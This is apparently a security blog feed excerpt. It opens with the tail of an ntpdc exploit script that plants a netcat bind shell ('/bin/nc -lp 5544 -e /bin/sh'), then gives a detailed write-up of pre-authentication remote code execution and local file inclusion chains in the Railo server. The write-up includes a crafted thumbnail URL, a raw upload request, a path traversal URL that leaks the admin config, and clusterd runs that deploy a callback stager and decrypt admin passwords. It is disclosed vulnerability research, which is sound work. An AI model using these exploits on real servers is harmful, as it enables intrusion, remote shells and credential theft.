</span><span class='line'>ld_pl += pack("&lt;I", 0xbffff60d) # payload addr based on empty env; probably wrong
</span><span class='line'>
</span><span class='line'>environ["EGG"] = "/bin/nc -lp 5544 -e /bin/sh"
</span><span class='line'>
</span><span class='line'>for idx in xrange(200):
</span><span class='line'>
</span><span class='line'>    for inc in xrange(200):
</span><span class='line'>
</span><span class='line'>        ld_pl = ld_pl + "\x41" * (LD_INITIAL_OFFSET + idx)
</span><span class='line'>        ld_pl += "\x43" * (LD_INITIAL_OFFSET + inc)
</span><span class='line'>
</span><span class='line'>        environ["LD_PRELOAD"] = ld_pl
</span><span class='line'>        system("echo %s | ntpdc 2&gt;&1" % sploit)</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[railo security - part four - pre-auth remote code execution]]></title>
    <link href="http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four/"/>
    <updated>2014-08-27T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four</id>
    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-auth rce</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three">Part three &ndash; pre-auth password retrieval</a></em><br/>
<em>Part four &ndash; pre-auth remote code execution</em></p>

<p>This post concludes our deep dive into the Railo application server by detailing not only one, but two pre-auth remote code execution vulnerabilities.  If you&rsquo;ve skipped the first three parts of this blog post to get to the juicy stuff, I don&rsquo;t blame you, but I do recommend going back and reading them; there&rsquo;s some important information and details back there.  In this post, we&rsquo;ll be documenting both vulnerabilities from start to finish, along with some demonstrations and notes on clusterd&rsquo;s implementation on one of these.</p>

<p>The first RCE vulnerability affects versions 4.1 and 4.2.x of Railo, 4.2.1 being the latest release.  Our vulnerability begins with the file <code>thumbnail.cfm</code>, which Railo uses to store admin thumbnails as static content on the server.  As previously noted, Railo relies on authentication measures via the cfadmin tag, and thus none of the cfm files actually contain authentication routines themselves.</p>

<p><code>thumbnail.cfm</code> first generates a hash of the image along with it&rsquo;s width and height:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset url.img=trim(url.img)&gt;
</span><span class='line'>&lt;cfset id=hash(url.img&"-"&url.width&"-"&url.height)&gt;
</span><span class='line'>&lt;cfset mimetypes={png:'png',gif:'gif',jpg:'jpeg'}&gt;</span></code></pre></td></tr></table></div></figure>


<p>Once it&rsquo;s got a hash, it checks if the file exists, and if not, attempts to read and write it down:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cffile action="readbinary" file="#url.img#" variable="data"&gt;
</span><span class='line'>&lt;cfimage action="read" source="#data#" name="img"&gt;
</span><span class='line'>
</span><span class='line'>&lt;!--- shrink images if needed ---&gt;
</span><span class='line'>&lt;cfif img.height GT url.height or img.width GT url.width&gt;
</span><span class='line'>    &lt;cfif img.height GT url.height &gt;
</span><span class='line'>        &lt;cfimage action="resize" source="#img#" height="#url.height#" name="img"&gt;
</span><span class='line'>    &lt;/cfif&gt;
</span><span class='line'>    &lt;cfif img.width GT url.width&gt;
</span><span class='line'>        &lt;cfimage action="resize" source="#img#" width="#url.width#" name="img"&gt;
</span><span class='line'>    &lt;/cfif&gt;
</span><span class='line'>    &lt;cfset data=toBinary(img)&gt;
</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>


<p>The <code>cffile</code> tag is used to read the raw image and then cast it via the <code>cfimage</code> tag.  The wonderful thing about <code>cffile</code> is that we can provide URLs that it will arbitrarily retrieve.  So, our URL can be this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.219:8888/railo-context/admin/thumbnail.cfm?img=http://192.168.1.97:8000/my_image.png&width=5000&height=50000</span></code></pre></td></tr></table></div></figure>


<p>And Railo will go and fetch the image and cast it.  Note that if a height and width are not provided it will attempt to resize it; we don&rsquo;t want this, and thus we provide large width and height values.  This file is written out to <code>/railo/temp/admin-ext-thumbnails/[HASH].[EXTENSION]</code>.</p>

<p>We&rsquo;ve now successfully written a file onto the remote system, and need a way to retrieve it.  The temp folder is not accessible from the web root, so we need some sort of LFI to fetch it.  Enter <code>jsloader.cfc</code>.</p>

<p><code>jsloader.cfc</code> is a Railo component used to fetch and load Javascript files.  In this file is a CF tag called <code>get</code>, which accepts a single argument <code>lib</code>, which the tag will read and return.  We can use this to fetch arbitrary Javascript files on the system and load them onto the page.  Note that it MUST be a Javascript file, as the extension is hard-coded into the file and null bytes don&rsquo;t work here, like they would in PHP.  Here&rsquo;s the relevant code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset var filePath = expandPath('js/#arguments.lib#.js')/&gt;
</span><span class='line'>    &lt;cfset var local = {result=""} /&gt;&lt;cfcontent type="text/javascript"&gt;
</span><span class='line'>        &lt;cfsavecontent variable="local.result"&gt;
</span><span class='line'>            &lt;cfif fileExists(filePath)&gt;
</span><span class='line'>                &lt;cfinclude template="js/#arguments.lib#.js"/&gt;
</span><span class='line'>            &lt;/cfif&gt;
</span><span class='line'>        &lt;/cfsavecontent&gt;
</span><span class='line'>    &lt;cfreturn local.result /&gt;</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s tie all this together.  Using <code>thumbnail.cfm</code>, we can write well-formed images to the file system, and using the <code>jsloader.cfc</code> file, we can read arbitrary Javascript.  Recall how log injection works with PHP; we can inject PHP tags into arbitrary files so long as the file is loaded by PHP, and parsed accordingly.  We can fill a file full of junk, but if the parser has its way a single <code>&lt;?phpinfo();?&gt;</code> will be discovered and executed; the CFML engine works the same way.</p>

<p>Our attack becomes much more clear: we generate a well-formed PNG file, embed CFML code into the image (metadata), set the extension to <code>.js</code>, and write it via <code>thumbnail.cfm</code>.  We then retrieve the file via <code>jsloader.cfc</code> and, because we&rsquo;re loading it with a CFM file, it will be parsed and executed.  Let&rsquo;s check this out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer jsload
</span><span class='line'>
</span><span class='line'>        clusterd/0.3.1 - clustered attack toolkit
</span><span class='line'>            [Supporting 6 platforms]
</span><span class='line'>
</span><span class='line'> [2014-06-15 03:39PM] Started at 2014-06-15 03:39PM
</span><span class='line'> [2014-06-15 03:39PM] Servers' OS hinted at windows
</span><span class='line'> [2014-06-15 03:39PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-06-15 03:39PM] Server hinted at 'railo'
</span><span class='line'> [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server...
</span><span class='line'> [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server Administrator...
</span><span class='line'> [2014-06-15 03:39PM] Checking railo version 4.1 Railo Web Administrator...
</span><span class='line'> [2014-06-15 03:39PM] Matched 2 fingerprints for service railo
</span><span class='line'> [2014-06-15 03:39PM]   Railo Server Administrator (version 4.1)
</span><span class='line'> [2014-06-15 03:39PM]   Railo Web Administrator (version 4.1)
</span><span class='line'> [2014-06-15 03:39PM] Fingerprinting completed.
</span><span class='line'> [2014-06-15 03:39PM] This deployer (jsload_lfi) requires an external listening port (8000).  Continue? [Y/n] &gt; 
</span><span class='line'> [2014-06-15 03:39PM] Preparing to deploy cmd.cfml...
</span><span class='line'> [2014-06-15 03:40PM] Waiting for remote server to download file [5s]]
</span><span class='line'> [2014-06-15 03:40PM] Invoking stager and deploying payload...
</span><span class='line'> [2014-06-15 03:40PM] Waiting for remote server to download file [7s]]
</span><span class='line'> [2014-06-15 03:40PM] cmd.cfml deployed at /railo-context/cmd.cfml
</span><span class='line'> [2014-06-15 03:40PM] Finished at 2014-06-15 03:40PM</span></code></pre></td></tr></table></div></figure>


<p>A couple things to note; as you may notice, the module currently requires the Railo server to connect back twice.  Once is for the image with embedded CFML, and the second for the payload.  We embed only a stager in the image that then connects back for the actual payload.</p>

<p>Sadly, the LFI was unknowingly killed in 4.2.1 with the following fix to <code>jsloader.cfc</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif arguments.lib CT ".."&gt;
</span><span class='line'>    &lt;cfheader statuscode="400"&gt;
</span><span class='line'>    &lt;cfreturn "// 400 - Bad Request"&gt;
</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>


<p>The <code>arguments.lib</code> variable contains our controllable path, but it kills our ability to traverse out.  Unfortunately, we can&rsquo;t substitute the .. with unicode or utf-16 due to the way Jetty and Java are configured, by default.  This file is pretty much useless to us now, unless we can write into the folder that <code>jsloader.cfc</code> reads from; then we don&rsquo;t need to traverse out at all.</p>

<p>We can still pop this on Express installs, due to the Jetty LFI discussed in part 3.  By simply traversing into the extensions folder, we can load up the Javascript file and execute our shell.  Railo installs still prove elusive.</p>

<p>buuuuuuuuuuuuuuuuuuuuuuuuut</p>

<p>Recall the <code>img.cfm</code> LFI from part 3; by tip-toeing back into the admin-ext-thumbnails folder, we can summon our vulnerable image and execute whatever coldfusion we shove into it.  This proves to be an even better choice than <code>jsloader.cfc</code>, as we don&rsquo;t need to traverse as far.  This bug only affects versions 4.1 &ndash; 4.2.1, as <code>thumbnail.cfm</code> wasn&rsquo;t added until 4.1.  <code>CVE-2014-5468</code> has been assigned to this issue.</p>

<p>The second RCE vulnerability is a bit easier and has a larger attack vector, spanning all versions of Railo.  As previously noted, Railo does not do per page/URL authentication, but rather enforces it when making changes via the <code>&lt;cfadmin&gt;</code> tag.  Due to this, any pages doing naughty things without checking with the tag may be exploitable, as previously seen.  Another such file is <code>overview.uploadNewLangFile.cfm</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif structKeyExists(form, "newLangFile")&gt;
</span><span class='line'>    &lt;cftry&gt;
</span><span class='line'>        &lt;cffile action="UPLOAD" filefield="form.newLangFile" destination="#expandPath('resources/language/')#" nameconflict="ERROR"&gt;
</span><span class='line'>        &lt;cfcatch&gt;
</span><span class='line'>            &lt;cfthrow message="#stText.overview.langAlreadyExists#"&gt;
</span><span class='line'>        &lt;/cfcatch&gt;
</span><span class='line'>    &lt;/cftry&gt;
</span><span class='line'>    &lt;cfset sFile = expandPath("resources/language/" & cffile.serverfile)&gt;
</span><span class='line'>    &lt;cffile action="READ" file="#sFile#" variable="sContent"&gt;
</span><span class='line'>    &lt;cftry&gt;
</span><span class='line'>        &lt;cfset sXML     = XMLParse(sContent)&gt;
</span><span class='line'>        &lt;cfset sLang    = sXML.language.XMLAttributes.label&gt;
</span><span class='line'>        &lt;cfset stInLang = GetFromXMLNode(sXML.XMLRoot.XMLChildren)&gt;
</span><span class='line'>        &lt;cfcatch&gt;
</span><span class='line'>            &lt;cfthrow message="#stText.overview.ErrorWhileReadingLangFile#"&gt;
</span><span class='line'>        &lt;/cfcatch&gt;
</span><span class='line'>    &lt;/cftry&gt;</span></code></pre></td></tr></table></div></figure>


<p>I mean, this might as well be an upload form to write arbitrary files.  It&rsquo;s stupid simple to get arbitrary data written to the system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /railo-context/admin/overview.uploadNewLangFile.cfm HTTP/1.1
</span><span class='line'>Host: localhost:8888
</span><span class='line'>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Referer: http://localhost:8888/railo-context/admin/server.cfm
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: multipart/form-data; boundary=AaB03x
</span><span class='line'>Content-Length: 140
</span><span class='line'>
</span><span class='line'>--AaB03x
</span><span class='line'>Content-Disposition: form-data; name="newLangFile"; filename="xxxxxxxxx.lang"
</span><span class='line'>Content-Type: text/plain
</span><span class='line'>
</span><span class='line'>thisisatest
</span><span class='line'>--AaB03x--</span></code></pre></td></tr></table></div></figure>


<p>The tricky bit is where it&rsquo;s written to; Railo uses a compression system that dynamically generates compressed versions of the web server, contained within <code>railo-context.ra</code>.  A mirror of these can be found under the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress</span></code></pre></td></tr></table></div></figure>


<p>The compressed data is then obfuscated behind two more folders, both MD5s.  In my example, it becomes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress\88d817d1b3c2c6d65e50308ef88e579c\0bdbf4d66d61a71378f032ce338258f2</span></code></pre></td></tr></table></div></figure>


<p>So we cannot simply traverse into this path, as the hashes change every single time a file is added, removed, or modified.  I&rsquo;ll walk the logic used to generate these, but as a precusor, we aren&rsquo;t going to figure these out without some other fashionable info disclosure bug.</p>

<p>The hashes are calculated in <code>railo-java/railo-core/src/railo/commons/io/res/type/compress/Compress.java</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>temp=temp.getRealResource("compress");                
</span><span class='line'>temp=temp.getRealResource(MD5.getDigestAsString(cid+"-"+ffile.getAbsolutePath()));
</span><span class='line'>if(!temp.exists())temp.createDirectory(true);
</span><span class='line'>}
</span><span class='line'>catch(Throwable t){}
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>    if(temp!=null) {
</span><span class='line'>        String name=Caster.toString(actLastMod)+":"+Caster.toString(ffile.length());
</span><span class='line'>        name=MD5.getDigestAsString(name,name);
</span><span class='line'>        root=temp.getRealResource(name);
</span><span class='line'>        if(actLastMod&gt;0 && root.exists()) return;</span></code></pre></td></tr></table></div></figure>


<p>The first hash is then <code>cid + "-" + ffile.getAbsolutePath()</code>, where <code>cid</code> is the randomly generated ID found in the <code>id</code> file (see part two) and <code>ffile.getAbsolutePath()</code> is the full path to the classes resource.  This is doable if we have the XXE, but 4.1+ is inaccessible.</p>

<p>The second hash is <code>actLastMode + ":" + ffile.length()</code>, where <code>actLastMode</code> is the last modified time of the file and <code>ffile.length()</code> is the obvious file length.  Again, this is likely not brute forcable without a serious infoleak vulnerability.  Hosts &lt;= 4.0 are exploitable, as we can list files with the XXE via the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py 
</span><span class='line'>88d817d1b3c2c6d65e50308ef88e579c
</span><span class='line'>
</span><span class='line'>[SNIP - in which we modify the path to include ^]
</span><span class='line'>
</span><span class='line'>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
</span><span class='line'>0bdbf4d66d61a71378f032ce338258f2
</span><span class='line'>
</span><span class='line'>[SNIP - in which we modify the path to include ^]
</span><span class='line'>
</span><span class='line'>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
</span><span class='line'>admin
</span><span class='line'>admin_cfc$cf.class
</span><span class='line'>admin_cfm$cf.class
</span><span class='line'>application_cfc$cf.class
</span><span class='line'>application_cfm$cf.class
</span><span class='line'>component_cfc$cf.class
</span><span class='line'>component_dump_cfm450$cf.class
</span><span class='line'>doc
</span><span class='line'>doc_cfm$cf.class
</span><span class='line'>form_cfm$cf.class
</span><span class='line'>gateway
</span><span class='line'>graph_cfm$cf.class
</span><span class='line'>jquery_blockui_js_cfm1012$cf.class
</span><span class='line'>jquery_js_cfm322$cf.class
</span><span class='line'>META-INF
</span><span class='line'>railo_applet_cfm270$cf.class
</span><span class='line'>res
</span><span class='line'>templates
</span><span class='line'>wddx_cfm$cf.class</span></code></pre></td></tr></table></div></figure>


<p><code>http_test_xxe.py</code> is just a small hack I wrote to exploit the XXE, in which we eventually obtain both valid hashes.  So we can exploit this in versions &lt;= 4.0 Express.  Later versions, as far as I can find, have no discernible way of obtaining full RCE without another infoleak or resorting to a slow, loud, painful death of brute forcing two MD5 hashes.</p>

<p>The first RCE is currently available in clusterd dev, and a PR is being made to Metasploit thanks to @BrandonPrry.  Hopefully it can be merged shortly.</p>

<p>As we conclude our Railo analysis, lets quickly recap the vulnerabilities discovered during this audit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Version 4.2:
</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
</span><span class='line'>    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express) (Up to version 4.2.0)
</span><span class='line'>Version 4.1:
</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
</span><span class='line'>    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>Version 4.0:
</span><span class='line'>    - Pre-authentication LFI via XXE (Install/Express)
</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>Version 3.x:
</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
</span><span class='line'>    - Pre-authentication LFI via XXE (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Express)</span></code></pre></td></tr></table></div></figure>


<p>This does not include the random XSS bugs or post-authentication issues.  At the end of it all, this appears to be a framework with great ideas, but <em>desperately</em> in need of code TLC.  Driving forward with a checklist of features may look nice on a README page, but the desolate wasteland of code left behind can be a scary thing.  Hopefully the Railo guys take note and spend some serious time evaluating and improving existing code.  The bugs found during this series have been disclosed to the developers; here&rsquo;s to hoping they follow through.</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-getrailo-error.jpg"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[railo security - part three - pre-authentication LFI]]></title>
    <link href="http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three/"/>
    <updated>2014-08-23T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three</id>
    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
<em>Part three &ndash; pre-authentication LFI</em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>

<p>This post continues our four part Railo security analysis with three pre-authentication LFI vulnerabilities.  These allow anonymous users access to retrieve the administrative plaintext password and login to the server&rsquo;s administrative interfaces.  If you&rsquo;re unfamiliar with Railo, I recommend at the very least reading part one of this series.  The most significant LFI discussed has been implemented as auxiliary modules in <a href="http://github.com/hatRiot/clusterd">clusterd</a>, though they&rsquo;re pretty trivial to exploit on their own.</p>

<p>We&rsquo;ll kick this portion off by introducing a pre-authentication LFI vulnerability that affects all versions of Railo Express; if you&rsquo;re unfamiliar with the Express install, it&rsquo;s really just a self-contained, no-installation-necessary package that harnesses Jetty to host the service.   The flaw actually has nothing to do with Railo itself, but rather in this packaged web server, Jetty.  <a href="http://www.cvedetails.com/cve/CVE-2007-6672/">CVE-2007-6672</a> addresses this issue, but it appears that the Railo folks have not bothered to update this.  Via the browser, we can pull the config file, complete with the admin hash, with <code>http://[host]:8888/railo-context/admin/..\..\railo-web.xml.cfm</code>.</p>

<p>A quick run of this in clusterd on Railo 4.0:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.0 --rl-pw
</span><span class='line'>
</span><span class='line'>        clusterd/0.3 - clustered attack toolkit
</span><span class='line'>            [Supporting 6 platforms]
</span><span class='line'>
</span><span class='line'> [2014-05-15 06:25PM] Started at 2014-05-15 06:25PM
</span><span class='line'> [2014-05-15 06:25PM] Servers' OS hinted at windows
</span><span class='line'> [2014-05-15 06:25PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-05-15 06:25PM] Server hinted at 'railo'
</span><span class='line'> [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server...
</span><span class='line'> [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server Administrator...
</span><span class='line'> [2014-05-15 06:25PM] Checking railo version 4.0 Railo Web Administrator...
</span><span class='line'> [2014-05-15 06:25PM] Matched 3 fingerprints for service railo
</span><span class='line'> [2014-05-15 06:25PM]   Railo Server (version 4.0)
</span><span class='line'> [2014-05-15 06:25PM]   Railo Server Administrator (version 4.0)
</span><span class='line'> [2014-05-15 06:25PM]   Railo Web Administrator (version 4.0)
</span><span class='line'> [2014-05-15 06:25PM] Fingerprinting completed.
</span><span class='line'> [2014-05-15 06:25PM] Attempting to pull password...
</span><span class='line'> [2014-05-15 06:25PM] Fetched encrypted password, decrypting...
</span><span class='line'> [2014-05-15 06:25PM] Decrypted password: default
</span><span class='line'> [2014-05-15 06:25PM] Finished at 2014-05-15 06:25PM</span></code></pre></td></tr></table></div></figure>


<p>and on the latest release of Railo, 4.2:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.2 --rl-pw
</span><span class='line'>
</span><span class='line'>        clusterd/0.3 - clustered attack toolkit
</span><span class='line'>            [Supporting 6 platforms]
</span><span class='line'>
</span><span class='line'> [2014-05-15 06:28PM] Started at 2014-05-15 06:28PM
</span><span class='line'> [2014-05-15 06:28PM] Servers' OS hinted at windows
</span><span class='line'> [2014-05-15 06:28PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-05-15 06:28PM] Server hinted at 'railo'
</span><span class='line'> [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server...
</span><span class='line'> [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server Administrator...
</span><span class='line'> [2014-05-15 06:28PM] Checking railo version 4.2 Railo Web Administrator...
</span><span class='line'> [2014-05-15 06:28PM] Matched 3 fingerprints for service railo
</span><span class='line'> [2014-05-15 06:28PM]   Railo Server (version 4.2)
</span><span class='line'> [2014-05-15 06:28PM]   Railo Server Administrator (version 4.2)
</span><span class='line'> [2014-05-15 06:28PM]   Railo Web Administrator (version 4.2)
</span><span class='line'> [2014-05-15 06:28PM] Fingerprinting completed.
</span><span class='line'> [2014-05-15 06:28PM] Attempting to pull password...
</span><span class='line'> [2014-05-15 06:28PM] Fetched password hash: d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b
